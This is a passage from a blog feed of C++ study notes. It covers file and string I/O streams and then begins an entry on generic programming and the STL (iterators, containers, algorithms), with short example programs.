href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6%E2%80%94%E6%8C%87%E5%AE%9Afixed/main.cpp">Control output precision - specifying fixed</a><br><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6%E2%80%94%E6%8C%87%E5%AE%9Ascientific">Control output precision - specifying scientific</a></p><h2 id="Output-to-Binary-Files"><a href="#Output-to-Binary-Files" class="headerlink" title="Output to Binary Files"></a>Output to Binary Files</h2><h3 id="Binary-File-Stream"><a href="#Binary-File-Stream" class="headerlink" title="Binary File Stream"></a>Binary File Stream</h3><p>Use the mode parameter in the ofstream constructor to specify binary output mode; construct a stream in the usual way, then use the setmode member function to change the mode after the file is opened; complete output through the binary file output stream object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Date</span> &#123; </span><br><span class="line"><span class="type">int</span> mon, day, year; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Date dt = &#123; <span class="number">6</span>, <span class="number">10</span>, <span class="number">92</span> &#125;;</span><br><span class="line"><span class="function">ofstream <span class="title">file</span><span class="params">(<span class="string">&quot;date.dat&quot;</span>, ios_base::binary)</span></span>;</span><br><span class="line">file.<span class="built_in">write</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span> *&gt;(&amp;dt),<span class="built_in">sizeof</span>(dt));</span><br><span class="line">file.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>The write function does not stop when encountering null characters, so it can write complete class structures. This function takes two parameters: a char pointer (actual address) and the number of bytes to write. <strong>Note that reinterpret_cast is needed to explicitly convert the object’s address to char * type.</strong></p></blockquote><h2 id="Output-to-Strings"><a href="#Output-to-Strings" class="headerlink" title="Output to Strings"></a>Output to Strings</h2><p>Using strings as the target of output streams can achieve the function of converting other data types to strings.</p><h3 id="String-Output-Stream-ostringstream"><a href="#String-Output-Stream-ostringstream" class="headerlink" title="String Output Stream (ostringstream)"></a>String Output Stream (ostringstream)</h3><p>Used to construct strings</p><p>Functions:</p><ul><li>Supports all operations of ofstream class except open and close</li><li>str function can return the currently constructed string</li></ul><p>Typical applications</p><ul><li>Convert numerical values to strings</li></ul><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%95%B0%E5%80%BC%E8%BD%AC%E5%8C%96%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2/main.cpp">Using ostringstream to convert numerical values to strings</a></p><h1 id="Input-Streams"><a href="#Input-Streams" class="headerlink" title="Input Streams"></a>Input Streams</h1><p>Important input stream classes:</p><ul><li>istream class is most suitable for sequential text mode input. cin is its instance.</li><li>ifstream class supports disk file input.</li><li>istringstream</li></ul><h2 id="Constructing-Input-Stream-Objects"><a href="#Constructing-Input-Stream-Objects" class="headerlink" title="Constructing Input Stream Objects"></a>Constructing Input Stream Objects</h2><ul><li>If a filename is specified in the constructor, the file is automatically opened when constructing the object.  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li>Use the open function to open the file after calling the default constructor.  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifstream myFile;<span class="comment">//Create a file stream object</span></span><br><span class="line">myFile.<span class="built_in">open</span>(<span class="string">&quot;filename&quot;</span>); <span class="comment">//Open file &quot;filename&quot;</span></span><br></pre></td></tr></table></figure></li><li>Can specify mode when opening file  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>, ios_base::in | ios_base::binary)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Using-Extraction-Operator-for-Input-from-Text-Files"><a href="#Using-Extraction-Operator-for-Input-from-Text-Files" class="headerlink" title="Using Extraction Operator for Input from Text Files"></a>Using Extraction Operator for Input from Text Files</h2><p>Extraction operator (&gt;&gt;) is pre-designed for all standard C++ data types. It is the easiest way to get bytes from an input stream object. Many manipulators in the ios class can be applied to input streams. But only a few have actual impact on input stream objects, the most important being the base manipulators dec, oct and hex.</p><h2 id="Input-Stream-Related-Functions"><a href="#Input-Stream-Related-Functions" class="headerlink" title="Input Stream Related Functions"></a>Input Stream Related Functions</h2><ul><li>open function associates the stream with a specific disk file.</li><li>get function is very similar to the extraction operator (&gt;&gt;), the main difference is that get function includes whitespace characters when reading data. (Introduced in Chapter 6)</li><li>getline function reads multiple characters from the input stream and allows specifying input termination characters. After reading is complete, the termination character is removed from the read content. (Introduced in Chapter 6)</li><li>read member function reads bytes from a file to a specified memory area, with the length parameter determining the number of bytes to read. Reading ends when encountering end of file or end of file marker character in text mode files.</li><li>seekg function is used to set the pointer for reading data position in file input stream.</li><li>tellg function returns the current position of the file read pointer.</li><li>close function closes the disk file associated with a file input stream.</li></ul><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E4%B8%80%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E5%BD%95%E5%88%B0%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%84%E4%B8%AD/main.cpp">Read a binary record from file to a structure</a><br><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E7%94%A8seekg%E5%87%BD%E6%95%B0%E8%AE%BE%E7%BD%AE%E4%BD%8D%E7%BD%AE%E6%8C%87%E9%92%88/main.cpp">Use seekg function to set position pointer</a><br><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E8%AF%BB%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%B9%B6%E6%98%BE%E7%A4%BA%E5%87%BA%E5%85%B6%E4%B8%AD0%E5%85%83%E7%B4%A0%E7%9A%84%E4%BD%8D%E7%BD%AE/main.cpp">Read a file and display positions of 0 elements in it</a></p><h2 id="Input-from-Strings-istringstream"><a href="#Input-from-Strings-istringstream" class="headerlink" title="Input from Strings (istringstream)"></a>Input from Strings (istringstream)</h2><p>Used to read data from strings, set the string to read in the constructor.</p><p>Functions</p><ul><li>Supports all operations of ifstream class except open and close</li></ul><p>Typical applications</p><ul><li>Convert strings to numerical values</li></ul><h1 id="Input-Output-Streams"><a href="#Input-Output-Streams" class="headerlink" title="Input&#x2F;Output Streams"></a>Input&#x2F;Output Streams</h1><h2 id="Two-Important-Input-Output-Streams"><a href="#Two-Important-Input-Output-Streams" class="headerlink" title="Two Important Input&#x2F;Output Streams"></a>Two Important Input&#x2F;Output Streams</h2><p>An iostream object can be a source or destination of data.</p><ul><li>Two important I&#x2F;O stream classes are derived from iostream: fstream and stringstream</li><li>These classes inherit the functionality of the istream and ostream classes described earlier.</li></ul><h2 id="fstream-Class"><a href="#fstream-Class" class="headerlink" title="fstream Class"></a>fstream Class</h2><p>fstream class supports disk file input and output.</p><ul><li>If you need to read from and write to a specific disk file in the same program, you can construct an fstream object.</li><li>An fstream object is a single stream with two logical sub-streams, one for input and the other for output.</li></ul><h2 id="stringstream-Class"><a href="#stringstream-Class" class="headerlink" title="stringstream Class"></a>stringstream Class</h2><p>stringstream class supports string-oriented input and output</p><ul><li>Can be used for alternating read and write operations on the same string content, also composed of two logical sub-streams.</li></ul><h1 id="Comprehensive-Example-Personal-Bank-Account-Management"><a href="#Comprehensive-Example-Personal-Bank-Account-Management" class="headerlink" title="Comprehensive Example - Personal Bank Account Management"></a>Comprehensive Example - Personal Bank Account Management</h1><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update5">Click to view source code</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Generic Programming and C++ Standard Template Library (STL)</title>
      <link href="/2022/08/04/Generic%20Programming%20and%20C++%20Standard%20Template%20Library%20(STL)/"/>
      <url>/2022/08/04/Generic%20Programming%20and%20C++%20Standard%20Template%20Library%20(STL)/</url>
      
        <content type="html"><![CDATA[<p>First, here are two reference articles:<br><a href="https://blog.csdn.net/weixin_61907955/article/details/123855928">STL Function Reference</a><br><a href="https://blog.csdn.net/weixin_41969690/article/details/106648441">What is STL?</a></p><h1 id="Generic-Programming-and-STL-Structure"><a href="#Generic-Programming-and-STL-Structure" class="headerlink" title="Generic Programming and STL Structure"></a>Generic Programming and STL Structure</h1><h2 id="Basic-Concepts-of-Generic-Programming"><a href="#Basic-Concepts-of-Generic-Programming" class="headerlink" title="Basic Concepts of Generic Programming"></a>Basic Concepts of Generic Programming</h2><p>Refers to writing programs that <strong>do not depend on specific data types</strong>. Templates are the main tools of generic programming.</p><p>Terminology: Concepts</p><p>Used to define data types that have certain functions. For example:</p><ul><li>The concept of “all data types that can be compared (with comparison operators)” is denoted as Comparable</li><li>The concept of “data types that have public copy constructors and can be assigned with ‘&#x3D;’” is denoted as Assignable</li><li>The concept of “all data types that can be compared, have public copy constructors and can be assigned with ‘&#x3D;’” is denoted as Sortable.</li></ul><p>For two different concepts A and B, if all the functions required by concept A are also required by concept B, then concept B is said to be a sub-concept of concept A. For example:</p><ul><li>Sortable is both a sub-concept of Comparable and a sub-concept of Assignable</li></ul><blockquote><p>Actually, this sub-concept is similar to derived classes from base classes.</p></blockquote><p>Terminology: Models</p><p>Model: A data type that conforms to a concept is called a model of that concept</p><ul><li>int type is a model of the Comparable concept;</li><li>Static array type is not a type of the Assignable concept (static arrays cannot be assigned).</li></ul><p>Using concepts as template parameter names</p><ul><li>Many STL implementation codes use concepts to name template parameters.</li><li>Give a concept a name and use that name as a template parameter name.</li></ul><p>For example:<br>Representing the prototype of a function template like insertionSort:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">Sortable</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertionSort</span><span class="params">(Sortable a[], <span class="type">int</span> n)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="STL-Introduction"><a href="#STL-Introduction" class="headerlink" title="STL Introduction"></a>STL Introduction</h1><p><strong>Standard Template Library</strong> provides some very commonly used data structures and algorithms.</p><p>Basic components of STL:</p><ul><li>Container</li><li>Iterator</li><li>Function object</li><li>Algorithms</li></ul><p>Basic relationships:</p><ul><li>Iterator is the bridge between algorithms and containers. Use iterators as algorithm parameters and access containers through iterators rather than passing containers directly as algorithm parameters;</li><li>Use function objects as algorithm parameters rather than making the operations performed by functions part of the algorithm.</li></ul><p>Relationship diagram:</p><p><img src="https://pic4.zhimg.com/80/v2-277324313f500492215f4604944da7fb_1440w.png"></p><h2 id="Basic-Components-of-STL-Containers"><a href="#Basic-Components-of-STL-Containers" class="headerlink" title="Basic Components of STL - Containers"></a>Basic Components of STL - Containers</h2><p>Containers are objects that hold a group of elements. The container class library includes seven basic containers: vector, deque, list, set, multiset, map, and multimap.</p><ul><li>Sequential containers: array, vector, deque, forward_list (singly linked list), list (list, underlying is doubly linked list);</li><li>Ordered associative containers: set, multiset, map, multimap;</li><li>Unordered associative containers: unordered_set, unordered_multiset, unordered_map, unordered_multimap.</li></ul><p>Container adapters: stack, queue, priority_queue (priority queue, underlying is max or min binary heap)</p><div class="note info flat"><p>To use containers, you need to include the corresponding header files.</p></div><h2 id="Basic-Components-of-STL-Iterators"><a href="#Basic-Components-of-STL-Iterators" class="headerlink" title="Basic Components of STL - Iterators"></a>Basic Components of STL - Iterators</h2><ul><li>Iterators are generalized pointers that provide methods for sequential access to each element in a container;</li><li>Provide methods for sequential access to each element in a container;</li><li>Can use the “++” operator to get an iterator pointing to the next element;</li><li>Can use the “*” operator to access the element pointed to by an iterator. If the element type is a class or structure, you can also use the “-&gt;” operator to directly access a member of that element;</li><li>Some iterators also support getting an iterator pointing to the previous element through the “–” operator;</li><li>Iterators are generalized pointers: pointers have the same characteristics, so pointers themselves are a type of iterator;</li><li>To use iterators independent of STL containers, you need to include the header file <code>&lt;iterator&gt;</code>.</li></ul><h2 id="Basic-Components-of-STL-Function-Objects"><a href="#Basic-Components-of-STL-Function-Objects" class="headerlink" title="Basic Components of STL - Function Objects"></a>Basic Components of STL - Function Objects</h2><ul><li>An object that behaves like a function, which can be called like a function.</li><li>Function objects are generalized functions: any ordinary function and any object of a class that overloads the “()” operator can be used as a function object.</li><li>To use STL function objects, you need to include the header file <code>&lt;functional&gt;</code>.</li></ul><h2 id="Basic-Components-of-STL-Algorithms"><a href="#Basic-Components-of-STL-Algorithms" class="headerlink" title="Basic Components of STL - Algorithms"></a>Basic Components of STL - Algorithms</h2><ul><li>STL includes more than 70 algorithms, such as: sorting algorithms, elimination algorithms, counting algorithms, comparison algorithms, transformation algorithms, permutation algorithms, and container management;</li><li>Can be widely used for different objects and built-in data types;</li><li>To use STL algorithms, you need to include the header file <code>&lt;algorithm&gt;</code>.</li></ul><h3 id="Algorithm-Example-transform-Algorithm"><a href="#Algorithm-Example-transform-Algorithm" class="headerlink" title="Algorithm Example - transform Algorithm"></a>Algorithm Example - transform Algorithm</h3><p>The transform algorithm sequentially traverses the elements pointed to by the two iterators first and last;</p><ul><li>Uses each element’s value as a parameter for the function object op;</li><li>Outputs op’s return value sequentially through iterator result;</li><li>After traversal is complete, the result iterator points to the position after the last output element, and transform will return that iterator.</li></ul><p>For example, the following could be one implementation of the transform algorithm:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>, <span class="keyword">class</span> <span class="title class_">UnaryFunction</span>&gt;</span><br><span class="line"><span class="function">OutputIterator <span class="title">transform</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result, UnaryFunction op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (;first != last; ++first, ++result) </span><br><span class="line">&#123;</span><br><span class="line">*result = <span class="built_in">op</span>(*first);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Read several integers from standard input, store in vector container, output their negatives</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">s</span><span class="params">(N)</span></span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">transform</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout,<span class="string">&quot; &quot;</span>),<span class="built_in">negate</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Iterators"><a href="#Iterators" class="headerlink" title="Iterators"></a>Iterators</h1><p>Iterators are the bridge between algorithms and containers:</p><ul><li>Iterators are used to access elements in containers</li><li>Algorithms do not directly operate on data in containers, but indirectly through iterators</li></ul><p>Algorithms and containers are independent:</p><ul><li>Adding new algorithms does not affect container implementation</li><li>Adding new containers, existing algorithms can still be applied</li></ul><h2 id="Input-Stream-Iterators-and-Output-Stream-Iterators"><a href="#Input-Stream-Iterators-and-Output-Stream-Iterators" class="headerlink" title="Input Stream Iterators and Output Stream Iterators"></a>Input Stream Iterators and Output Stream Iterators</h2><p>Input stream iterators</p><ul><li><code>istream_iterator&lt;T&gt;</code></li><li>Constructed with input stream (such as cin) as parameter</li><li>Can use *(p++) to get the next input element<br>Output stream iterators</li><li><code>ostream_iterator&lt;T&gt;</code></li><li>Need to provide output stream (such as cout) when constructing</li><li>Can use (*p++) &#x3D; x to output x to the output stream</li></ul><p>Both belong to adapters</p><ul><li>Adapters are objects used to provide new interfaces for existing objects</li><li>Input stream adapters and output stream adapters provide iterator interfaces for stream objects</li></ul><p>Program example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Read several real numbers from standard input, output their squares</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">square</span><span class="params">(<span class="type">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">transform</span>(<span class="built_in">istream_iterator</span>&lt;<span class="type">double</span>&gt;(cin),<span class="built_in">istream_iterator</span>&lt;<span class="type">double</span>&gt;(),<span class="built_in">ostream_iterator</span>&lt;<span class="type">double</span>&gt;(cout,<span class="string">&quot;\t&quot;</span>),square);</span><br><span class="line">    <span class="comment">//istream_iterator&lt;double&gt;() calls the default constructor of the input stream iterator, making it point to the end position of the input stream.</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//If you don&#x27;t manually terminate the program, it will keep running because the input stream is always waiting for your input</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Iterator-Classification"><a href="#Iterator-Classification" class="headerlink" title="Iterator Classification"></a>Iterator Classification</h2><p>Classified by access method:<br><img src="https://img-blog.csdnimg.cn/20200609192939833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTk2OTY5MA==,size_16,color_FFFFFF,t_70" alt="Fetching Title#2j8d"></p><p>Relationship diagram:<br><img src="https://pica.zhimg.com/80/v2-9cb5c611c9ab48c561a010de1208c150_1440w.png"></p><p>Classified by operation type:<br><img src="https://img-blog.csdnimg.cn/20200609192955690.png"></p><h2 id="Iterator-Ranges"><a href="#Iterator-Ranges" class="headerlink" title="Iterator Ranges"></a>Iterator Ranges</h2><ul><li>Two iterators represent a range: [p1, p2), the range includes p1 but not p2;</li><li>STL algorithms often use iterator ranges as input to pass input data;</li><li>Valid range: p1 satisfies p1 &#x3D;&#x3D; p2 after n (n &gt; 0) increment (++) operations.</li></ul><p>Program example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Example of comprehensive use of various iterators</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySort</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;T&gt; s;</span><br><span class="line">    <span class="keyword">while</span> (first != last)</span><br><span class="line">    &#123;</span><br><span class="line">        s.<span class="built_in">push_back</span>(*first);</span><br><span class="line">        first++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>()); <span class="comment">//sort parameters must be random access iterators</span></span><br><span class="line">    <span class="built_in">copy</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> a[<span class="number">5</span>] = &#123;<span class="number">1.2</span>, <span class="number">2.4</span>, <span class="number">0.8</span>, <span class="number">3.3</span>, <span class="number">3.2</span>&#125;;</span><br><span class="line">    <span class="comment">//Sort known array</span></span><br><span class="line">    <span class="built_in">mySort</span>&lt;<span class="type">double</span>&gt;(a, a + <span class="number">5</span>, <span class="built_in">ostream_iterator</span>&lt;<span class="type">double</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//Read several integers from standard input, output sorted results</span></span><br><span class="line">    <span class="built_in">mySort</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">istream_iterator</span>&lt;<span class="type">int</span>&gt;(cin), <span class="built_in">istream_iterator</span>&lt;<span class="type">int</span>&gt;(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Iterator-Helper-Functions"><a href="#Iterator-Helper-Functions" class="headerlink" title="Iterator Helper Functions"></a>Iterator Helper Functions</h2><ul><li>advance(p,n): Perform n increment operations on p</li><li>distance(first,last): Calculate the distance between two iterators first and last</li></ul><h1 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h1><h2 id="Basic-Functions-and-Classification-of-Containers"><a href="#Basic-Functions-and-Classification-of-Containers" class="headerlink" title="Basic Functions and Classification of Containers"></a>Basic Functions and Classification of Containers</h2><p><img src="https://pica.zhimg.com/80/v2-015ee01d628fdd4ee76acf4213a6d583_1440w.png"></p><p>Common functions of containers</p><ul><li>Construct empty containers with default constructors</li><li>Support relational operators: &#x3D;&#x3D;, !&#x3D;, &lt;, &lt;&#x3D;, &gt;, &gt;&#x3D;</li><li>begin(), end(): Get container head and tail iterators (<strong>actually pointing to the element after the last element of the container</strong>)</li><li>cbegin(), cend(): Get container head and tail const iterators, safer when not changing the container</li><li>clear(): Clear the container</li><li>empty(): Check if the container is empty</li><li>size(): Get the number of elements in the container</li><li>s1.swap(s2): Swap the contents of containers s1 and s2</li></ul><p>Related data types (S represents container type)</p><ul><li>S::iterator: Iterator type pointing to container elements</li><li>S::const_iterator: Const iterator type</li></ul><p>Using begin()&#x2F;end() of general containers, the iterators obtained are all forward iterators, while reversible containers provide bidirectional iterators.</p><div class="note info flat"><p>In fact, STL templates provide standard containers that are at least reversible containers, but some non-standard template libraries provide containers like slist (singly linked list) that only provide forward iterators.</p></div><h3 id="Access-to-Reversible-Containers"><a href="#Access-to-Reversible-Containers" class="headerlink" title="Access to Reversible Containers"></a>Access to Reversible Containers</h3><p>STL provides reverse iterators for each reversible container, which can be obtained through the following member functions:</p><ul><li>rbegin(): Reverse iterator pointing to the end of the container</li><li>rend(): Reverse iterator pointing to the beginning of the container</li></ul><p>The type names of reverse iterators are represented as follows (S represents container type):</p><ul><li>S::reverse_iterator: Reverse iterator type</li><li>S::const_reverse_iterator: Reverse const iterator type</li></ul><p>Reverse iterators are adapters of ordinary iterators, where ++ of reverse iterators is mapped to – of forward iterators.</p><blockquote><p>Details:<br>An iterator and its reverse iterator can be converted to each other. For example: if p1 is an iterator of type S::iterator, then using the expression S::reverse_iterator(p1) can get the reverse iterator corresponding to p1; you can also use the base function to get the ordinary iterator corresponding to the reverse iterator, such as: r1 is a reverse iterator constructed through S::reverse_iterator(p1), then r1.base() &#x3D;&#x3D; p1. But r1 and p1 do not point to the same element, the element pointed to by r1 is always the same as the element pointed to by p1-1.</p></blockquote><h2 id="Sequential-Containers"><a href="#Sequential-Containers" class="headerlink" title="Sequential Containers"></a>Sequential Containers</h2><p>Sequential containers in STL</p><ul><li><p>vector</p></li><li><p>deque</p></li><li><p>list</p></li><li><p>forward_list</p></li><li><p>array</p></li><li><p>Elements are arranged linearly, and elements can be inserted and deleted at specified positions at any time.</p></li><li><p>Must conform to the Assignable concept (i.e., have public copy constructors and can be assigned with “&#x3D;”).</p></li><li><p>array objects have fixed size, forward_list has special add and delete operations.</p></li></ul><h3 id="Sequential-Container-Interface"><a href="#Sequential-Container-Interface" class="headerlink" title="Sequential Container Interface"></a>Sequential Container Interface</h3><div class="note danger flat"><p>Does not include singly linked list (forward_list) and array</p></div><ol><li>Constructors<ul><li>List initialization, such as <code>vector&lt;int&gt; arr = &#123;1,4,5,7&#125;;</code></li></ul></li><li>Assignment functions<ul><li>assign</li></ul></li><li>Insert functions<ul><li><code>insert(iterator pos, const T&amp; v)</code>, after inserting at pos position, returns the iterator of the newly inserted element;</li><li>push_front (only for list and deque), push_back;</li><li>emplace_front, emplace and emplace_back, these operations construct rather than copy elements into the container, these operations correspond to push_front, insert and push_back respectively, allowing us to place elements at the head of the container, a specified position and the tail of the container.</li></ul></li><li>Delete functions<ul><li>erase, clear, pop_front (only for list and deque), pop_back</li></ul></li><li>Direct access to head and tail elements<ul><li>front, 